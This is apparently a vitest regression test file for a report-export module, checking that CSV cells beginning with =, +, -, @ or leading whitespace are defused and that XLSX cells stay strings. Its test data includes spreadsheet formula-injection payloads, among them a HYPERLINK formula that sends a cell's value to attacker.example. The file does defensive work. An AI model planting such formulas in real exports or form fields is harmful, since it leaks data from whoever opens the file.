import { describe, expect, it } from 'vitest';
import * as ExcelJS from 'exceljs';
import {
  csvSafeCell,
  reportToCsv,
  reportToWorkbook,
} from '../src/modules/reports/report-export.util';
import type { ReportResult } from '../src/modules/reports/reports.service';

/**
 * Spreadsheet formula injection in report exports.
 *
 * This is the platform's shortest unauthenticated-to-staff-workstation path:
 * the name fields feeding several reports are writable by anyone through the
 * public intake forms, the payload is inert on the server, and it executes in
 * Excel on whichever laptop opens the export. The regression risk is high and
 * quiet — a new export helper doing its own stringify would reintroduce it with
 * nothing failing — so both writers are pinned here.
 */

const resultWith = (values: string[]): ReportResult => ({
  columns: [{ key: 'name', label: 'Name' }],
  rows: values.map((name) => ({ name })),
});

describe('csvSafeCell', () => {
  // Every lead a spreadsheet reads as the start of a formula: the three sigils,
  // Lotus-style '@', and the whitespace skipped before the sigil is read.
  it.each([
    ['=HYPERLINK("https://attacker.example/"&A2,"Open me")'],
    ['=1+1'],
    ['+1+1'],
    ['-1+1'],
    ['@SUM(A1:A9)'],
    ['\t=1+1'],
    ['\r=1+1'],
  ])('defuses %j', (payload) => {
    const out = csvSafeCell(payload);
    expect(out).toBe(`'${payload}`);
    // Defused, not truncated — the value survives intact behind the marker.
    expect(String(out).slice(1)).toBe(payload);
  });

  it.each([
    ['Smith'],
    ['Mary-Jane'],
    ['123 Oak St'],
    ['a@b.com'],
    [''],
    ['Answer = 42'],
    ['(555) 010-0100'],
  ])('leaves the ordinary value %j alone', (value) => {
    expect(csvSafeCell(value)).toBe(value);
  });

  it('does not touch non-strings, which cannot carry a formula', () => {
    expect(csvSafeCell(-1)).toBe(-1);
    expect(csvSafeCell(0)).toBe(0);
    expect(csvSafeCell(false)).toBe(false);
    expect(csvSafeCell(null)).toBe(null);
  });
});

describe('reportToCsv', () => {
  it('actually applies the escaping to rendered rows', () => {
    // Comma-free payloads so the assertion can read raw lines without a parser.
    const csv = reportToCsv(resultWith(['=1+1', '+1', '-1', '@SUM(A1)']));
    const lines = csv.trim().split('\n').slice(1); // drop the header

    expect(lines).toHaveLength(4);
    for (const line of lines) {
      expect(line.startsWith("'"), `field was not defused: ${line}`).toBe(true);
    }
  });

  it('defuses a payload that also needs CSV quoting', () => {
    const csv = reportToCsv(resultWith(['=HYPERLINK("https://attacker.example/"&A2,"Open")']));
    // Quoted because it contains commas and quotes, AND marked as text.
    expect(csv).toContain('"\'=HYPERLINK(');
  });

  it('renders an ordinary row unchanged', () => {
    const csv = reportToCsv(resultWith(['Smith']));
    expect(csv.trim().split('\n')[1]).toBe('Smith');
  });
});

describe('reportToWorkbook', () => {
  /**
   * The companion assertion to reportToWorkbook's comment: XLSX needs no
   * escaping because a plain string is written as a cell Excel never evaluates.
   * That is a property of the library rather than of the format as we use it,
   * so it is pinned rather than assumed — if it ever changes, the CSV-style
   * escaping has to be added here too.
   */
  it('writes formula-shaped values as strings, never as formula cells', () => {
    const payloads = ['=HYPERLINK("https://x/","c")', '=1+1', '+1', '-1', '@SUM(A1)'];
    const sheet = reportToWorkbook(resultWith(payloads), 'payloads').getWorksheet('payloads')!;

    payloads.forEach((payload, i) => {
      const cell = sheet.getCell(i + 2, 1); // row 1 is the header
      expect(cell.type).toBe(ExcelJS.ValueType.String);
      expect(cell.formula).toBeUndefined();
      // Stored verbatim — no apostrophe is added here, unlike the CSV path.
      expect(cell.value).toBe(payload);
    });
  });
});
